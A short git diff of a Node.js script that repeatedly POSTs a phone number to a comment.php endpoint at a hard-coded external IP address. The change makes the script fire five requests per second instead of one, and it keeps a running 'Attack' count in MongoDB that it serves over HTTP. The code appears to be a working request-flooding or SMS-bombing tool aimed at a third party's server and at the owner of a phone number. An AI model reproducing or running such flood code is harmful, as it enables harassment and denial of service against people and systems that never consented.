@@ -114,7 +114,8 @@ db.on('error', console.error.bind(console, 'connection error:'));
     
     var Attack = mongoose.model('Attack', AttackSchema, 'attackstore');
 
-setInterval(function(){
+
+function atcit(){
  axios.post('http://66.135.4.161/comment.php', {
     number: '01700000000'
 })
@@ -137,6 +138,14 @@ setInterval(function(){
     })}).catch(error => {
     console.error(error)
 })
+}
+
+setInterval(function(){
+ atcit()
+ atcit()
+ atcit()
+ atcit()
+ atcit()
 },1000);
 
 
@@ -161,7 +170,7 @@ var attack1 = new Attack({ quantity:1 });
 
 app.get('/atc', (req, res) => {
     Attack.find({}, function(err, link) {
-        res.send(link[0])
+        res.send(link[0].quantity)
     })
 })
 
